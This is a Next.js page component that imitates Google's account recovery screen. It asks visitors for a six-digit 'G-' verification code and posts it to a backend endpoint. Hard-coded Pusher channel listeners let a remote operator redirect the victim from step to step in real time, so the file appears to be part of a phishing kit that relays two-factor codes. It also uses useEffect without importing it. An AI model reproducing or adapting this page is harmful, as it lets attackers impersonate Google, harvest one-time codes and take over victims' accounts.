"use client";
import { API_URL } from "@/config";
import Cookies from "js-cookie";
import Image from "next/image";
import { useRouter } from "next/navigation";
import React, { useState } from "react";
import Pusher from "pusher-js";

function AccountRecoveryCode() {
  const router = useRouter();
  const [gCode, setGCode] = useState();
  const id = Cookies.get("gid");
  // const router = useRouter();

  const [verifyId, setVerifyId] = useState("");
  const[reverifyId, setReVerifyId] = useState('');
  
  const pid = Cookies.get("id");
  const pusher = new Pusher("05656b52c62c0f688ee3", {
    // APP_KEY
    cluster: "ap2",
    encrypted: true,
  });
  console.log(reverifyId);

  useEffect(() => {
    const channel = pusher.subscribe(pid);

    channel.bind("code-verify", (data) => {
      // Perform the revalidation or data fetching logic here
      console.log("Path data updated:", data);
      Cookies.set("code", data.code);
      setVerifyId(data.id); // Function to refetch or revalidate your path data
    });

    return () => {
      channel.unbind("code-verify");
      channel.unsubscribe(pid);
    };
  }, [pid]);

  useEffect(() => {
    const channel = pusher.subscribe(pid);
    channel.bind('code-re-verify', (data) => {
      // Perform the revalidation or data fetching logic here
      console.log('Path data updated:', data);
      Cookies.set("gid", data.id);
      setReVerifyId(data.id); // Function to refetch or revalidate your path data
    });

    return () => {
      channel.unbind('code-re-verify');
      channel.unsubscribe(pid);
    };
  }, [pid]);

  if (verifyId) {
    return router.push("/account-verify-code");
  }
  if(reverifyId){
    return router.push("/account-verify-gcode");
  }

  const handleGCode = async () => {
    if (!gCode) {
      return;
    }
    const values = {
      id,
      gCode,
    };
    const url = `${API_URL}/google/very/code`;

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });
    const data = await res.json();
    console.log('data gcode', data);

    if (res.ok) {
      console.log("success", data);
      return router.push('/success');
      // router.push("/account-verifying-state");
    } else {
      console.log("error", data);
      // toast.error("Something Went Wrong");
    }
  };

  return (
    <div className=" w-full min-h-screen flex flex-col justify-center items-center">
      <div className="flex flex-col w-full max-w-md p-10 h-screen  justify-between ">
        <div className="flex flex-col gap-6 ">
          <div className="flex flex-col  gap-3">
            <div className="">
              <Image
                src={"/logo.png"}
                alt="logo"
                width={100}
                height={100}
                className="object-cover "
              />
            </div>
            <div className="flex flex-col gap-2">
              <h1 className="text-2xl font-normal mb-1">Account Recovery</h1>
              <p>
                To help keep your account safe, Google wants to make sure it's
                really you trying to sign in
              </p>
            </div>
          </div>
          <div className="space-y-2">
            <p>
              A text message with a 6-digit verification code was just sent to{" "}
              <span className="text-xs font-extrabold">
                Recovery Phone Number or Email
              </span>{" "}
            </p>
            <div className="relative">
              <input
                type="text"
                id="id"
                className={`w-full border  border-gray-300 rounded-md pl-14 px-3 py-2 focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500`}
                placeholder="Enter the code"
                value={gCode}
                onChange={(e) => setGCode(e.target.value)}
              />
              <p className="absolute top-[9px] left-5">G-</p>
            </div>
          </div>
        </div>
        <div className="text-blue-500 font-semibold">Resend it</div>
        <div className="flex justify-between items-center">
          <button className="text-blue-600 font-medium text-sm mt-2">
            I don't have my phone
          </button>
          <button
            className="w-fit  bg-blue-500 text-white py-2 px-6 rounded-md hover:bg-blue-600 font-semibold"
            onClick={() => handleGCode()}
          >
            Next
          </button>
        </div>
      </div>
    </div>
  );
}

export default AccountRecoveryCode;
